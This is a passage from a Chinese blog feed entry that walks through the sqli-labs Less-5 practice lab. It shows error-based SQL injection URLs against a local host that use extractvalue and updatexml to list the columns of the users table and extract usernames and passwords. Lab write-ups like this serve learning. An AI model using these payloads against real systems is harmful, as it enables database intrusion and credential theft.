src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191358718.png" alt="image-20220523191358718"></p><ul><li>获取字段名</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191518031.png" alt="image-20220523191518031"></p><ul><li>获取数据</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+</span><span class="token comment">#1依次加31即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523194258334.png" alt="image-20220523194258334"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;测试上线使用&lt;/p&gt;
&lt;p&gt;注意点：PHP 要使用低版本，高版本无法安装	&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;相关</summary>
      
    
    
    
    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="测试" scheme="http://example.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
